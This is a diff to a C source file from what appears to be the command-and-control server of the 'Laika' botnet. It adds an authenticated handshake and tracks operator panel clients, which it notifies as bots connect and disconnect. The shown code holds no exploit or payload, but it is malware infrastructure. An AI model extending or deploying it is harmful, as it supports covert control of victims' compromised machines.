@@ -3,13 +3,15 @@
 #include "lsocket.h"
 #include "lerror.h"
 
+#include "cpanel.h"
 #include "cnc.h"
 
 LAIKAPKT_SIZE laikaC_pktSizeTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + crypto_kx_PUBLICKEYBYTES
+    [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + crypto_kx_PUBLICKEYBYTES,
+    [LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ] = sizeof(uint8_t),
 };
 
-void handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     char magicBuf[LAIKA_MAGICLEN];
     struct sLaika_cnc *cnc = (struct sLaika_cnc*)uData;
     uint8_t major, minor;
@@ -39,16 +41,23 @@ void handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     laikaS_writeByte(&peer->sock, laikaS_isBigEndian());
     laikaS_endOutPacket(peer);
 
+    /* send bot connection info to any connected panel clients */
+
     LAIKA_DEBUG("accepted handshake from peer %lx\n", peer);
 }
 
 PeerPktHandler laikaC_handlerTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_REQ] = handleHandshakeRequest
+    [LAIKAPKT_HANDSHAKE_REQ] = laikaC_handleHandshakeRequest,
+    [LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ] = laikaC_handleAuthenticatedHandshake,
 };
 
 struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
     struct sLaika_cnc *cnc = laikaM_malloc(sizeof(struct sLaika_cnc));
     size_t _unused;
+
+    cnc->panels = NULL;
+    cnc->panelCap = 4;
+    cnc->panelCount = 0;
 
     /* init socket & pollList */
     laikaS_initSocket(&cnc->sock);
@@ -86,10 +95,54 @@ void laikaC_freeCNC(struct sLaika_cnc *cnc) {
     laikaM_free(cnc);
 }
 
+void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
+    int i;
+
+    /* notify connected panels of the connected peer */
+    for (i = 0; i < cnc->panelCount; i++) {
+        laikaC_sendNewPeer(cnc->panels[i], peer);
+    }
+}
+
+void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
+    int i;
+
+    /* notify connected panels of the disconnected peer */
+    for (i = 0; i < cnc->panelCount; i++) {
+        laikaC_sendRmvPeer(cnc->panels[i], peer);
+    }
+}
+
+void laikaC_rmvPanel(struct sLaika_cnc *cnc, struct sLaika_peer *panel) {
+    int i;
+
+    for (i = 0; i < cnc->panelCount; i++) {
+        if (cnc->panels[i] == panel) { /* we found the index for our panel! */
+            laikaM_rmvarray(cnc->panels, cnc->panelCap, i, 1);
+            break;
+        }
+    }
+}
+
+void laikaC_addPanel(struct sLaika_cnc *cnc, struct sLaika_peer *panel) {
+    /* grow array if we need to */
+    laikaM_growarray(struct sLaika_peer*, cnc->panels, 1, cnc->panelCount, cnc->panelCap);
+
+    /* insert into authenticated panel table */
+    cnc->panels[cnc->panelCount++] = panel;
+}
+
 void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
-    LAIKA_DEBUG("peer %lx killed!\n", peer);
+    laikaC_onRmvPeer(cnc, peer);
+
+    /* remove peer from panels list (if it's a panel) */
+    if (peer->type == PEER_PANEL)
+        laikaC_rmvPanel(cnc, peer);
+
     laikaP_rmvSock(&cnc->pList, (struct sLaika_socket*)peer);
     laikaS_freePeer(peer);
+
+    LAIKA_DEBUG("peer %lx killed!\n", peer);
 }
 
 bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
@@ -120,6 +173,8 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
 
             /* add to our pollList */
             laikaP_addSock(&cnc->pList, &peer->sock);
+
+            laikaC_onAddPeer(cnc, peer);
 
             LAIKA_DEBUG("new peer %lx!\n", peer);
             continue;
